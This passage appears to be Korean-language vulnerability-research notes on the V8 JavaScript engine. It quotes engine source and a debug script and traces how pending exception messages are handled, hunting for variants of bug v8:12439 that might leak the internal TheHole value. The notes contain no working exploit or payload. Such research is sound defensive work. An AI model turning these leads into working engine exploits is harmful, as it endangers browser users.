    <span class="n">v8</span><span class="o">::</span><span class="n">Local</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Context</span><span class="o">&gt;</span> <span class="n">context</span><span class="p">,</span> <span class="n">v8</span><span class="o">::</span><span class="n">Module</span><span class="o">::</span><span class="n">ResolveModuleCallback</span> <span class="n">callback</span><span class="p">,</span>
    <span class="n">Module</span><span class="o">::</span><span class="n">DeprecatedResolveCallback</span> <span class="n">callback_without_import_assertions</span><span class="p">)</span> <span class="p">{</span>
                <span class="p">...</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">callback</span><span class="p">(</span><span class="n">context</span><span class="p">,</span> <span class="n">v8</span><span class="o">::</span><span class="n">Utils</span><span class="o">::</span><span class="n">ToLocal</span><span class="p">(</span><span class="n">specifier</span><span class="p">),</span>
                    <span class="n">v8</span><span class="o">::</span><span class="n">Utils</span><span class="o">::</span><span class="n">FixedArrayToLocal</span><span class="p">(</span><span class="n">import_assertions</span><span class="p">),</span>
                    <span class="n">v8</span><span class="o">::</span><span class="n">Utils</span><span class="o">::</span><span class="n">ToLocal</span><span class="p">(</span><span class="n">Handle</span><span class="o">&lt;</span><span class="n">Module</span><span class="o">&gt;::</span><span class="n">cast</span><span class="p">(</span><span class="n">module</span><span class="p">)))</span>
               <span class="p">.</span><span class="n">ToLocal</span><span class="p">(</span><span class="o">&amp;</span><span class="n">api_requested_module</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">isolate</span><span class="o">-&gt;</span><span class="n">PromoteScheduledException</span><span class="p">();</span>
        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">callback_without_import_assertions</span><span class="p">(</span>
               <span class="n">context</span><span class="p">,</span> <span class="n">v8</span><span class="o">::</span><span class="n">Utils</span><span class="o">::</span><span class="n">ToLocal</span><span class="p">(</span><span class="n">specifier</span><span class="p">),</span>
               <span class="n">v8</span><span class="o">::</span><span class="n">Utils</span><span class="o">::</span><span class="n">ToLocal</span><span class="p">(</span><span class="n">Handle</span><span class="o">&lt;</span><span class="n">Module</span><span class="o">&gt;::</span><span class="n">cast</span><span class="p">(</span><span class="n">module</span><span class="p">)))</span>
               <span class="p">.</span><span class="n">ToLocal</span><span class="p">(</span><span class="o">&amp;</span><span class="n">api_requested_module</span><span class="p">))</span> <span class="p">{</span>
        <span class="n">isolate</span><span class="o">-&gt;</span><span class="n">PromoteScheduledException</span><span class="p">();</span>
        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
      <span class="p">}</span>
                <span class="p">...</span>
</code></pre></div></div>

<p>PrepareInstantiate 함수 역할이 뭔지, callback이 뭐하는 앤지, callback_without_import_assertions이 뭐하는 앤지 모르겠다. 당장은 이해하기 어려움… TODO</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">src</span><span class="o">/</span><span class="n">objects</span><span class="o">/</span><span class="n">synthetic</span><span class="o">-</span><span class="n">module</span><span class="p">.</span><span class="n">cc</span>
<span class="n">MaybeHandle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">SyntheticModule</span><span class="o">::</span><span class="n">Evaluate</span><span class="p">(</span><span class="n">Isolate</span><span class="o">*</span> <span class="n">isolate</span><span class="p">,</span>
                                              <span class="n">Handle</span><span class="o">&lt;</span><span class="n">SyntheticModule</span><span class="o">&gt;</span> <span class="n">module</span><span class="p">)</span> <span class="p">{</span>
                <span class="p">...</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">evaluation_steps</span><span class="p">(</span>
           <span class="n">Utils</span><span class="o">::</span><span class="n">ToLocal</span><span class="p">(</span><span class="n">Handle</span><span class="o">&lt;</span><span class="n">Context</span><span class="o">&gt;::</span><span class="n">cast</span><span class="p">(</span><span class="n">isolate</span><span class="o">-&gt;</span><span class="n">native_context</span><span class="p">())),</span>
           <span class="n">Utils</span><span class="o">::</span><span class="n">ToLocal</span><span class="p">(</span><span class="n">Handle</span><span class="o">&lt;</span><span class="n">Module</span><span class="o">&gt;::</span><span class="n">cast</span><span class="p">(</span><span class="n">module</span><span class="p">)))</span>
           <span class="p">.</span><span class="n">ToLocal</span><span class="p">(</span><span class="o">&amp;</span><span class="n">result</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">isolate</span><span class="o">-&gt;</span><span class="n">PromoteScheduledException</span><span class="p">();</span>
    <span class="n">Module</span><span class="o">::</span><span class="n">RecordErrorUsingPendingException</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">module</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">MaybeHandle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span><span class="p">();</span>
  <span class="p">}</span>
                <span class="p">...</span>
</code></pre></div></div>

<p>이 코드도 역할을 잘 모르겠음. 당장은 이해하기 어려움… TODO</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">RUNTIME_FUNCTION</span><span class="p">(</span><span class="n">Runtime_PromoteScheduledException</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">SealHandleScope</span> <span class="n">shs</span><span class="p">(</span><span class="n">isolate</span><span class="p">);</span>
  <span class="n">DCHECK_EQ</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">length</span><span class="p">());</span>
  <span class="k">return</span> <span class="n">isolate</span><span class="o">-&gt;</span><span class="n">PromoteScheduledException</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>

<p>runtime 함수도 있네… 어떻게 써먹지? ㅋㅋ</p>

<p>PromoteScheduledException 얘는 has_scheduled_exception() 안붙어있는 애들은 위에 언급한 애들이 전부인 듯. 다 훑어보자.</p>

<h3 id="scheduled_exception">scheduled_exception()</h3>

<p>scheduled_exception() 호출 전에 has_scheduled_exception() 으로 검증하지 않아야 할 듯.</p>

<p>찾아봤는데 PromoteScheduledException 관련 외에는 모두 has_scheduled_exception()을 거치는 듯.</p>

<h3 id="assign_return_on_scheduled_exception_value">[ASSIGN_]RETURN_ON_SCHEDULED_EXCEPTION_VALUE</h3>

<p>키워드 검색 시 몇 개 안나옴, TODO</p>

<h3 id="etc">etc</h3>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="n">Isolate</span><span class="o">::</span><span class="n">clear_pending_message</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">set_pending_message</span><span class="p">(</span><span class="n">ReadOnlyRoots</span><span class="p">(</span><span class="k">this</span><span class="p">).</span><span class="n">the_hole_value</span><span class="p">());</span>
<span class="p">}</span>
</code></pre></div></div>

<p>얘도 참고하자. (얘는 IteratorCloseOnException 관련하여)</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">src</span><span class="o">/</span><span class="n">execution</span><span class="o">/</span><span class="n">isolate</span><span class="p">.</span><span class="n">cc</span>
<span class="kt">void</span> <span class="n">Isolate</span><span class="o">::</span><span class="n">RestorePendingMessageFromTryCatch</span><span class="p">(</span><span class="n">v8</span><span class="o">::</span><span class="n">TryCatch</span><span class="o">*</span> <span class="n">handler</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">DCHECK</span><span class="p">(</span><span class="n">handler</span> <span class="o">==</span> <span class="n">try_catch_handler</span><span class="p">());</span>
  <span class="n">DCHECK</span><span class="p">(</span><span class="n">handler</span><span class="o">-&gt;</span><span class="n">HasCaught</span><span class="p">());</span>
  <span class="n">DCHECK</span><span class="p">(</span><span class="n">handler</span><span class="o">-&gt;</span><span class="n">rethrow_</span><span class="p">);</span>
  <span class="n">DCHECK</span><span class="p">(</span><span class="n">handler</span><span class="o">-&gt;</span><span class="n">capture_message_</span><span class="p">);</span>
  <span class="n">Object</span> <span class="n">message</span><span class="p">(</span><span class="k">reinterpret_cast</span><span class="o">&lt;</span><span class="n">Address</span><span class="o">&gt;</span><span class="p">(</span><span class="n">handler</span><span class="o">-&gt;</span><span class="n">message_obj_</span><span class="p">));</span>
  <span class="n">DCHECK</span><span class="p">(</span><span class="n">message</span><span class="p">.</span><span class="n">IsJSMessageObject</span><span class="p">()</span> <span class="o">||</span> <span class="n">message</span><span class="p">.</span><span class="n">IsTheHole</span><span class="p">(</span><span class="k">this</span><span class="p">));</span>
  <span class="n">set_pending_message</span><span class="p">(</span><span class="n">message</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>이런 코드들을 보면 애초에 message는 TheHole이어도 된다고 가정하고 코딩한 듯 하다. 그 얘기는, 결국 TheHole값이 정상적으로 필터링 될 것임을 의미하는 것인가…</p>

<hr />

<h2 id="v812439">v8:12439</h2>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">src</span><span class="o">/</span><span class="n">builtins</span><span class="o">/</span><span class="n">builtins</span><span class="o">-</span><span class="n">temporal</span><span class="o">-</span><span class="n">gen</span><span class="p">.</span><span class="n">cc</span>
<span class="n">TNode</span><span class="o">&lt;</span><span class="n">FixedArray</span><span class="o">&gt;</span>
<span class="n">TemporalBuiltinsAssembler</span><span class="o">::</span><span class="n">TemporalInstantFixedArrayFromIterable</span><span class="p">(</span>
    <span class="n">TNode</span><span class="o">&lt;</span><span class="n">Context</span><span class="o">&gt;</span> <span class="n">context</span><span class="p">,</span> <span class="n">TNode</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">iterable</span><span class="p">)</span> <span class="p">{</span>
            <span class="p">...</span>
      <span class="n">BIND</span><span class="p">(</span><span class="o">&amp;</span><span class="n">if_exception</span><span class="p">);</span>
      <span class="n">IteratorCloseOnException</span><span class="p">(</span><span class="n">context</span><span class="p">,</span> <span class="n">iterator_record</span><span class="p">);</span>
      <span class="n">CallRuntime</span><span class="p">(</span><span class="n">Runtime</span><span class="o">::</span><span class="n">kReThrow</span><span class="p">,</span> <span class="n">context</span><span class="p">,</span> <span class="n">var_exception</span><span class="p">.</span><span class="n">value</span><span class="p">());</span>
      <span class="n">Unreachable</span><span class="p">();</span>
            <span class="p">...</span>
</code></pre></div></div>

<p>IteratorCloseOnException + Runtime::kReThrow 조합인데? builtins-temporal-gen.cc 는 bug:v8:12439 때 없던 파일임. 이거 많이 수상한데…</p>

<p>https://chromium.googlesource.com/v8/v8/+blame/8b663818fc311217c2cdaaab935f020578bfb7a8/src/builtins/builtins-temporal-gen.cc</p>

<p>2022-01-06 에 추가됨(v8:12439는 2021-11-27, commit은 2021-12-06)</p>

<p>이건 지금 바로 봐야겠다.</p>

<h3 id="참고---test-코드">참고 - test 코드</h3>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">test</span><span class="o">/</span><span class="n">cctest</span><span class="o">/</span><span class="n">heap</span><span class="o">/</span><span class="n">test</span><span class="o">-</span><span class="n">heap</span><span class="p">.</span><span class="n">cc</span>
<span class="k">static</span> <span class="kt">void</span> <span class="nf">CheckLeak</span><span class="p">(</span><span class="k">const</span> <span class="n">v8</span><span class="o">::</span><span class="n">FunctionCallbackInfo</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Value</span><span class="o">&gt;&amp;</span> <span class="n">args</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">Isolate</span><span class="o">*</span> <span class="n">isolate</span> <span class="o">=</span> <span class="n">CcTest</span><span class="o">::</span><span class="n">i_isolate</span><span class="p">();</span>
  <span class="n">Object</span> <span class="n">message</span><span class="p">(</span>
      <span class="o">*</span><span class="k">reinterpret_cast</span><span class="o">&lt;</span><span class="n">Address</span><span class="o">*&gt;</span><span class="p">(</span><span class="n">isolate</span><span class="o">-&gt;</span><span class="n">pending_message_address</span><span class="p">()));</span>
  <span class="n">CHECK</span><span class="p">(</span><span class="n">message</span><span class="p">.</span><span class="n">IsTheHole</span><span class="p">(</span><span class="n">isolate</span><span class="p">));</span>
<span class="p">}</span>
</code></pre></div></div>

<p>pending message가 TheHole 인지를 확인하는 체크 코드…?</p>

<h3 id="iteratorcloseonexception">IteratorCloseOnException</h3>

<p>patchset 1 을 보면 src/builtins/iterator.tq 내 IteratorCloseOnException 에서 <del>Pending Message 관련 처리가 이미 추가되었음… 따라서 이미 패치가 된 것으로 봐야 할 수도. :(</del></p>

<p>patchset 1 에서 추가되었다가 피드백을 받아 변경되었음. 꼼꼼히 보자.</p>

<p>힌트를 얻기 위해서 commit message 등을 보고 있는데…</p>

<ol>
  <li>(from v8:12439)
    <blockquote>
      <p>We currently don’t do that. So when Isolate::pending_message is being cleared or overwritten by an unrelated exception inside of JS code called from IteratorCloseOnException, it can result in the original exception being combined with an unrelated message or TheHole.</p>
    </blockquote>
  </li>
  <li>(from patchset 1)
    <blockquote>
      <p>[builtins] IteratorCloseOnException needs to preserve the pending message</p>
    </blockquote>
  </li>
</ol>

<p>pending message를 백업해두지 않으면 IterateCloseOnException 내에서 임의 js 수행 시 pending exception + pending message 가 overwritten 될 수 있으므로 이를 고려하여 pending message를 보존해두어야 한다는 의미.</p>

<p>IterateCloseOnException 내에서 임의 js 실행, 다른 Exception 발생(+ 그 exception이 message를 TheHole로 설정하는 경우를 찾아야 함?)</p>

<p>message가 TheHole일 경우 유저에게 TheHole이 leak 되는지 확인 필요(즉, 정말 보안 이슈가 있는지, 아니면 단순 메시지 출력의 오류일 뿐인지 확인 필요)</p>

<p><code class="language-plaintext highlighter-rouge">SetPendingMessage(TheHole);</code>를 이미 쓰고 있는 것을 보아… TheHole이 leak되는 경우는 없는 것 같기도 하다… 쩝.</p>

<p>참고: GetAndResetPendingMessage도 v8:12439 에서 추가됨</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">src</span><span class="o">/</span><span class="n">codegen</span><span class="o">/</span><span class="n">code</span><span class="o">-</span><span class="n">stub</span><span class="o">-</span><span class="n">assembler</span><span class="p">.</span><span class="n">cc</span>
<span class="n">TNode</span><span class="o">&lt;</span><span class="n">HeapObject</span><span class="o">&gt;</span> <span class="n">CodeStubAssembler</span><span class="o">::</span><span class="n">GetPendingMessage</span><span class="p">()</span> <span class="p">{</span>
  <span class="n">TNode</span><span class="o">&lt;</span><span class="n">ExternalReference</span><span class="o">&gt;</span> <span class="n">pending_message</span> <span class="o">=</span> <span class="n">ExternalConstant</span><span class="p">(</span>
      <span class="n">ExternalReference</span><span class="o">::</span><span class="n">address_of_pending_message</span><span class="p">(</span><span class="n">isolate</span><span class="p">()));</span>
  <span class="k">return</span> <span class="n">UncheckedCast</span><span class="o">&lt;</span><span class="n">HeapObject</span><span class="o">&gt;</span><span class="p">(</span><span class="n">LoadFullTagged</span><span class="p">(</span><span class="n">pending_message</span><span class="p">));</span>
<span class="p">}</span>
<span class="kt">void</span> <span class="n">CodeStubAssembler</span><span class="o">::</span><span class="n">SetPendingMessage</span><span class="p">(</span><span class="n">TNode</span><span class="o">&lt;</span><span class="n">HeapObject</span><span class="o">&gt;</span> <span class="n">message</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">CSA_DCHECK</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="n">Word32Or</span><span class="p">(</span><span class="n">IsTheHole</span><span class="p">(</span><span class="n">message</span><span class="p">),</span>
                            <span class="n">InstanceTypeEqual</span><span class="p">(</span><span class="n">LoadInstanceType</span><span class="p">(</span><span class="n">message</span><span class="p">),</span>
                                              <span class="n">JS_MESSAGE_OBJECT_TYPE</span><span class="p">)));</span>
  <span class="n">TNode</span><span class="o">&lt;</span><span class="n">ExternalReference</span><span class="o">&gt;</span> <span class="n">pending_message</span> <span class="o">=</span> <span class="n">ExternalConstant</span><span class="p">(</span>
      <span class="n">ExternalReference</span><span class="o">::</span><span class="n">address_of_pending_message</span><span class="p">(</span><span class="n">isolate</span><span class="p">()));</span>
  <span class="n">StoreFullTaggedNoWriteBarrier</span><span class="p">(</span><span class="n">pending_message</span><span class="p">,</span> <span class="n">message</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>위와 같이 GetPendingMessage, SetPendingMessage 가 v8:12439에서 추가됨.</p>

<h3 id="exception-message-pending-message">exception message, pending message</h3>

<p>익셉션의 메시지는 어떤 흐름을 거쳐서 js에서 접근하게 되는거지?</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">src</span><span class="o">/</span><span class="n">execution</span><span class="o">/</span><span class="n">isolate</span><span class="p">.</span><span class="n">cc</span>
<span class="n">Object</span> <span class="n">Isolate</span><span class="o">::</span><span class="n">ThrowInternal</span><span class="p">(</span><span class="n">Object</span> <span class="n">raw_exception</span><span class="p">,</span> <span class="n">MessageLocation</span><span class="o">*</span> <span class="n">location</span><span class="p">)</span> <span class="p">{</span>
                    <span class="p">...</span>
  <span class="c1">// Generate the message if required.</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">requires_message</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">rethrowing_message</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">MessageLocation</span> <span class="n">computed_location</span><span class="p">;</span>
    <span class="c1">// If no location was specified we try to use a computed one instead.</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">location</span> <span class="o">==</span> <span class="nb">nullptr</span> <span class="o">&amp;&amp;</span> <span class="n">ComputeLocation</span><span class="p">(</span><span class="o">&amp;</span><span class="n">computed_location</span><span class="p">))</span> <span class="p">{</span>
      <span class="n">location</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">computed_location</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">bootstrapper</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">IsActive</span><span class="p">())</span> <span class="p">{</span>
                    <span class="p">...</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">message_obj</span> <span class="o">=</span> <span class="n">CreateMessageOrAbort</span><span class="p">(</span><span class="n">exception</span><span class="p">,</span> <span class="n">location</span><span class="p">);</span>
      <span class="n">set_pending_message</span><span class="p">(</span><span class="o">*</span><span class="n">message_obj</span><span class="p">);</span>
    <span class="p">}</span>
  <span class="p">}</span>

  <span class="c1">// Set the exception being thrown.</span>
  <span class="n">set_pending_exception</span><span class="p">(</span><span class="o">*</span><span class="n">exception</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">ReadOnlyRoots</span><span class="p">(</span><span class="n">heap</span><span class="p">()).</span><span class="n">exception</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">try</span> <span class="p">{</span>
  <span class="c1">//throw new Error("");</span>
  <span class="c1">//throw new Error();</span>
  <span class="k">throw</span> <span class="k">new</span> <span class="nb">Error</span><span class="p">(</span><span class="dl">"</span><span class="s2">qwerasdf</span><span class="dl">"</span><span class="p">);</span>
<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
  <span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
  <span class="o">%</span><span class="nx">SystemBreak</span><span class="p">();</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">e: </span><span class="dl">"</span><span class="p">);</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">e.stack: </span><span class="dl">"</span><span class="p">);</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">stack</span><span class="p">);</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">e.message: </span><span class="dl">"</span><span class="p">);</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">message</span><span class="p">);</span>
  <span class="o">%</span><span class="nx">DebugPrint</span><span class="p">(</span><span class="nx">e</span><span class="p">);</span>
  <span class="o">%</span><span class="nx">SystemBreak</span><span class="p">();</span>
  <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">message</span><span class="p">);</span>
<span class="p">}</span>

</code></pre></div></div>

<p>아래와 같은 js 코드를 이용하여 Throw를 통해 익셉션을 발생시키면 위의 ThrowInternal 코드가 수행됨. 이해가 잘 안되는 점은, CreateMessageOrAbort 를 통해 JSMessageObject 객체를 생성하고 이를 set_pending_message(…)를 통해 설정하는 것이 catch를 통해 잡은 e의 message 프로퍼티와 무관해보인다는 점임. 실제로, CreateMessageOrAbort 및 set_pending_message 구문을 변경하거나 주석처리해도 message 프로퍼티에 저장되는 값은 변화가 없음.</p>

<p>지금 드는 생각 하나. message 프로퍼티는 Error 클래스의 생성자에서 발생하는 것 같다. 그렇다면, pending_message의 역할은 대체 뭐지?</p>

<h4 id="throw-를-통한-익셉션-처리-과정-및-분석">throw 를 통한 익셉션 처리 과정 및 분석</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DEBUG:: v8::internal::Object v8::internal::Isolate::ThrowInternal(v8::internal::Object, v8::internal::MessageLocation *)
--- raw_exception ---
0x17fb0004a631: [JS_ERROR_TYPE]
 - map: 0x17fb00207bc9 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]
 - prototype: 0x17fb001c5cd1 &lt;Object map = 0x17fb002028d1&gt;
 - elements: 0x17fb00002269 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
 - properties: 0x17fb00002269 &lt;FixedArray[0]&gt;
 - All own properties (excluding elements): {
    0x17fb000057c1: [String] in ReadOnlySpace: #stack: 0x17fb0014432d &lt;AccessorInfo&gt; (const accessor descriptor), location: descriptor
    0x17fb0000501d: [String] in ReadOnlySpace: #message: 0x17fb001d3591 &lt;String[8]: #qwerasdf&gt; (const data field 0), location: in-object
    0x17fb00005bf1 &lt;Symbol: (error_stack_symbol)&gt;: 0x17fb0004a671 &lt;FixedArray[1]&gt; (const data field 1), location: in-object
 }
</code></pre></div></div>

<p>ThrowInternal의 첫 번째 인자 raw_exception 이 js 코드에서 throw로 던진 객체임. 문자열을 던졌을 경우 문자열 객체가 raw_exception에 들어가며 <code class="language-plaintext highlighter-rouge">new Error("qwerasdf")</code>를 던졌을 경우 JS_ERROR_TYPE 객체가 들어감. 위 로그에서는 JS_ERROR_TYPE 객체의 message 프로퍼티에 문자열 “qwerasdf”가 들어있는 것을 확인할 수 있음. 즉, 던질 객체가 생성될 때 이미 message 프로퍼티에 문자열이 저장됨.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">src</span><span class="o">/</span><span class="n">builtins</span><span class="o">/</span><span class="n">accessors</span><span class="p">.</span><span class="n">cc</span>
<span class="kt">void</span> <span class="n">Accessors</span><span class="o">::</span><span class="n">ArrayLengthSetter</span><span class="p">(</span>
    <span class="n">v8</span><span class="o">::</span><span class="n">Local</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Name</span><span class="o">&gt;</span> <span class="n">name</span><span class="p">,</span> <span class="n">v8</span><span class="o">::</span><span class="n">Local</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Value</span><span class="o">&gt;</span> <span class="n">val</span><span class="p">,</span>
    <span class="k">const</span> <span class="n">v8</span><span class="o">::</span><span class="n">PropertyCallbackInfo</span><span class="o">&lt;</span><span class="n">v8</span><span class="o">::</span><span class="n">Boolean</span><span class="o">&gt;&amp;</span> <span class="n">info</span><span class="p">)</span> <span class="p">{</span>   
                    <span class="p">...</span>
  <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">length_obj</span> <span class="o">=</span> <span class="n">Utils</span><span class="o">::</span><span class="n">OpenHandle</span><span class="p">(</span><span class="o">*</span><span class="n">val</span><span class="p">);</span>
                    <span class="p">...</span>
  <span class="kt">uint32_t</span> <span class="n">length</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">JSArray</span><span class="o">::</span><span class="n">AnythingToArrayLength</span><span class="p">(</span><span class="n">isolate</span><span class="p">,</span> <span class="n">length_obj</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">length</span><span class="p">))</span> <span class="p">{</span>
    <span class="n">isolate</span><span class="o">-&gt;</span><span class="n">OptionalRescheduleException</span><span class="p">(</span><span class="nb">false</span><span class="p">);</span>
    <span class="k">return</span><span class="p">;</span>
  <span class="p">}</span>
                    <span class="p">...</span>

<span class="n">src</span><span class="o">/</span><span class="n">objects</span><span class="o">/</span><span class="n">objects</span><span class="p">.</span><span class="n">cc</span>
<span class="kt">bool</span> <span class="n">JSArray</span><span class="o">::</span><span class="n">AnythingToArrayLength</span><span class="p">(</span><span class="n">Isolate</span><span class="o">*</span> <span class="n">isolate</span><span class="p">,</span>
                                    <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">length_object</span><span class="p">,</span>
                                    <span class="kt">uint32_t</span><span class="o">*</span> <span class="n">output</span><span class="p">)</span> <span class="p">{</span>
                    <span class="p">...</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">uint32_v</span><span class="o">-&gt;</span><span class="n">Number</span><span class="p">()</span> <span class="o">!=</span> <span class="n">number_v</span><span class="o">-&gt;</span><span class="n">Number</span><span class="p">())</span> <span class="p">{</span>
    <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">exception</span> <span class="o">=</span>
        <span class="n">isolate</span><span class="o">-&gt;</span><span class="n">factory</span><span class="p">()</span><span class="o">-&gt;</span><span class="n">NewRangeError</span><span class="p">(</span><span class="n">MessageTemplate</span><span class="o">::</span><span class="n">kInvalidArrayLength</span><span class="p">);</span>
    <span class="n">isolate</span><span class="o">-&gt;</span><span class="n">Throw</span><span class="p">(</span><span class="o">*</span><span class="n">exception</span><span class="p">);</span>
    <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
  <span class="p">}</span>
                    <span class="p">...</span>
</code></pre></div></div>

<p>Throw를 수행하는 한 예임. <code class="language-plaintext highlighter-rouge">a = [1, 2, 3]; a.length = "asdf";</code> 와 같이 수행하면 <code class="language-plaintext highlighter-rouge">"Invalid array length"</code> 문자열이 포함된 에러 객체가 생성되는 과정임.</p>

<p>던질 객체의 message 프로퍼티에 저장되는 메시지와 pending_message는 다른 개념인가보다. pending_message에 저장되는 JSMessageObject는 콘솔에 출력되는 그 문자열을 의미하는 듯…</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code>      <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">message_obj</span> <span class="o">=</span> <span class="n">CreateMessageOrAbort</span><span class="p">(</span><span class="n">exception</span><span class="p">,</span> <span class="n">location</span><span class="p">);</span>
      <span class="n">set_pending_message</span><span class="p">(</span><span class="o">*</span><span class="n">message_obj</span><span class="p">);</span>
</code></pre></div></div>
<p>ThrowInternal의 raw_exception은 <code class="language-plaintext highlighter-rouge">Handle&lt;Object&gt; exception(raw_exception, this);</code> 핸들 형태의 exception으로 감싸진 후 CreateMessageOrAbort 함수로 전달되고 그 결과가 set_pending_message에 전달됨.</p>

<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">src</span><span class="o">/</span><span class="n">execution</span><span class="o">/</span><span class="n">isolate</span><span class="p">.</span><span class="n">cc</span>
<span class="n">Handle</span><span class="o">&lt;</span><span class="n">JSMessageObject</span><span class="o">&gt;</span> <span class="n">Isolate</span><span class="o">::</span><span class="n">CreateMessageOrAbort</span><span class="p">(</span>
    <span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">exception</span><span class="p">,</span> <span class="n">MessageLocation</span><span class="o">*</span> <span class="n">location</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">Handle</span><span class="o">&lt;</span><span class="n">JSMessageObject</span><span class="o">&gt;</span> <span class="n">message_obj</span> <span class="o">=</span> <span class="n">CreateMessage</span><span class="p">(</span><span class="n">exception</span><span class="p">,</span> <span class="n">location</span><span class="p">);</span>

<span class="n">Handle</span><span class="o">&lt;</span><span class="n">JSMessageObject</span><span class="o">&gt;</span> <span class="n">Isolate</span><span class="o">::</span><span class="n">CreateMessage</span><span class="p">(</span><span class="n">Handle</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span> <span class="n">exception</span><span class="p">,</span>
                                               <span class="n">MessageLocation</span><span class="o">*</span> <span class="n">location</span><span class="p">)</span> <span class="p">{</span>
                    <span class="p">...</span>
  <span class="k">return</span> <span class="n">MessageHandler</span><span class="o">::</span><span class="n">MakeMessageObject</span><span class="p">(</span>
      <span class="k">this</span><span class="p">,</span> <span class="n">MessageTemplate</span><span class="o">::</span><span class="n">kUncaughtException</span><span class="p">,</span> <span class="n">location</span><span class="p">,</span> <span class="n">exception</span><span class="p">,</span>
      <span class="n">stack_trace_object</span><span class="p">);</span>
<span class="p">}</span>

